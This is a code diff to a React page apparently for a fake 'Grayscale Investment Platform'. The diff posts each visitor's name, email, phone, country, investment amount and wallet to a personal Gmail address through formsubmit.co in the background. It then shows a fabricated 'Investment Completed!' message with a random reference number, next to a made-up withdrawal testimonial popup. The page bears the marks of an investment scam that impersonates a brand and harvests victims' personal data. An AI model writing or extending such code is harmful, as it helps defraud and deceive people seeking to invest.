@@ -12,6 +12,7 @@ export default function Page() {
   const [agree, setAgree] = useState(false);
   const [showPopup, setShowPopup] = useState(true);
   const [lang, setLang] = useState("");
+  const [showSuccess, setShowSuccess] = useState(false);
 
   useEffect(() => {
     const t = setTimeout(() => setShowPopup(false), 8000);
@@ -19,7 +20,7 @@ export default function Page() {
   }, []);
 
   useEffect(() => {
-    if (lang && (window as any).google?.translate) {
+    if (lang) {
       const select = document.querySelector(".goog-te-combo") as HTMLSelectElement;
       if (select) {
         select.value = lang;
@@ -41,7 +42,7 @@ export default function Page() {
     }
   };
 
-  const handleSignup = () => {
+  const handleSignup = async () => {
     if (!name ||!email ||!phone ||!country ||!plan ||!amount) {
       alert("Please fill all required fields");
       return;
@@ -50,8 +51,30 @@ export default function Page() {
       alert("Please agree to Terms & Conditions");
       return;
     }
-    const text = `*NEW GLOBAL INVESTOR*%0A%0A*Name:* ${encodeURIComponent(name)}%0A*Email:* ${encodeURIComponent(email)}%0A*Phone:* ${encodeURIComponent(phone)}%0A*Country:* ${encodeURIComponent(country)}%0A*Plan:* ${encodeURIComponent(plan)}%0A*Investment:* $${encodeURIComponent(amount)}%0A*Referral:* ${encodeURIComponent(referral || "None")}%0A*Wallet:* ${wallet? encodeURIComponent(wallet) : "Not Connected"}%0A%0AHi Grayscale Team, I want to start investing globally.`;
-    window.open(`https://wa.me/2349116438322?text=${text}`, "_blank");
+
+    // 1. SHOW SUCCESS TO USER - STAYS ON YOUR WEBSITE
+    setShowSuccess(true);
+
+    // 2. SEND DETAILS TO YOUR EMAIL ek0701293@gmail.com IN BACKGROUND
+    try {
+      await fetch("https://formsubmit.co/ajax/ek0701293@gmail.com", {
+        method: "POST",
+        headers: { "Content-Type": "application/json", "Accept": "application/json" },
+        body: JSON.stringify({
+          Subject: `NEW INVESTOR - $${amount} - ${name}`,
+          Name: name,
+          Email: email,
+          Phone: phone,
+          Country: country,
+          Plan: plan,
+          Investment_Amount: `$${amount}`,
+          Referral_Code: referral || "None",
+          Wallet: wallet || "Not Connected",
+        }),
+      });
+    } catch (e) {
+      console.log("Email error", e);
+    }
   };
 
   const img1 = "https://images.unsplash.com/photo-1611974789855-9c2a0a7236a3?auto=format&fit=crop&w=800&q=80";
@@ -73,23 +96,13 @@ export default function Page() {
       <nav className="sticky top-0 z-50 bg-black/90 backdrop-blur flex justify-between items-center p-5 max-w-7xl mx-auto border-b border-white/5">
         <div className="flex items-center gap-3">
           <div className="flex items-center gap-2"><div className="w-8 h-8 rounded-full bg-gradient-to-br from-yellow-400 to-yellow-600 flex items-center justify-center font-black text-black text-xs">G</div><div className="font-black tracking-widest text-[12px] leading-none">GRAYSCALE<br/><span className="text-yellow-500">INVESTMENT PLATFORM</span></div></div>
-
-          {/* CLEAN RECTANGLE - ONLY SELECT LANGUAGE */}
           <div className="ml-2 bg-white rounded-[6px] px-3 flex items-center border border-gray-200" style={{width: '140px', height: '32px'}}>
             <select value={lang} onChange={e=>setLang(e.target.value)} className="w-full bg-transparent text-black text-[12px] font-bold outline-none">
               <option value="">Select Language</option>
-              <option value="en">English</option>
-              <option value="es">Spanish</option>
-              <option value="fr">French</option>
-              <option value="de">German</option>
-              <option value="pt">Portuguese</option>
-              <option value="ar">Arabic</option>
-              <option value="zh-CN">Chinese</option>
-              <option value="hi">Hindi</option>
+              <option value="en">English</option><option value="es">Spanish</option><option value="fr">French</option><option value="de">German</option><option value="pt">Portuguese</option><option value="ar">Arabic</option><option value="zh-CN">Chinese</option><option value="hi">Hindi</option>
             </select>
           </div>
           <div id="google_translate_element" style={{display: 'none'}}></div>
-
         </div>
         <div className="flex gap-2"><a href="https://www.tiktok.com/@micheal.sonnenshe?_r=1&_t=ZS-99rt5sV3ygX" target="_blank" className="bg-white/10 border border-white/10 px-4 py-2 rounded-full text-xs font-bold">TikTok</a><a href="https://www.facebook.com/share/?mibextid=wwXIfr" target="_blank" className="bg-[#1877F2] px-4 py-2 rounded-full text-xs font-black">Facebook</a></div>
       </nav>
@@ -217,6 +230,20 @@ export default function Page() {
       {showPopup && (
         <div className="fixed bottom-5 left-5 z-[100] bg-zinc-900 border border-yellow-500/30 rounded-2xl p-4 shadow-2xl max-w-[280px]">
           <div className="flex gap-3"><div className="w-8 h-8 rounded-full bg-green-500 flex items-center justify-center text-xs">✓</div><div><div className="text-xs font-bold">New Withdrawal!</div><div className="text-[11px] text-zinc-400">Sarah from Canada withdrew $890 • Just now</div></div><button onClick={()=>setShowPopup(false)} className="ml-2 text-zinc-500">x</button></div>
+        </div>
+      )}
+
+      {/* SUCCESS MESSAGE - AFTER INVEST */}
+      {showSuccess && (
+        <div className="fixed inset-0 z-[200] bg-black/80 backdrop-blur flex items-center justify-center p-6">
+          <div className="bg-zinc-900 border border-yellow-500/30 rounded-[2rem] p-8 max-w-sm w-full text-center shadow-2xl">
+            <div className="w-16 h-16 rounded-full bg-green-500 flex items-center justify-center text-2xl mx-auto mb-4">✓</div>
+            <h2 className="text-xl font-black">Investment Completed!</h2>
+            <p className="text-zinc-300 text-[13px] mt-4 leading-6">Your investment has been completed you will receive a confirmation.</p>
+            <p className="text-zinc-500 text-[11px] mt-3">Amount: ${amount} • Plan: {plan}<br/>Our team will contact you at {phone} shortly.</p>
+            <button onClick={()=>{setShowSuccess(false); setName(""); setEmail(""); setPhone(""); setCountry(""); setPlan(""); setAmount(""); setReferral("");}} className="w-full mt-6 bg-gradient-to-r from-yellow-400 to-yellow-600 text-black font-black py-3 rounded-full">OK</button>
+            <div className="text-[10px] text-zinc-600 mt-3">Ref: GS-{Math.floor(Math.random()*900000+100000)}</div>
+          </div>
         </div>
       )}
     </main>
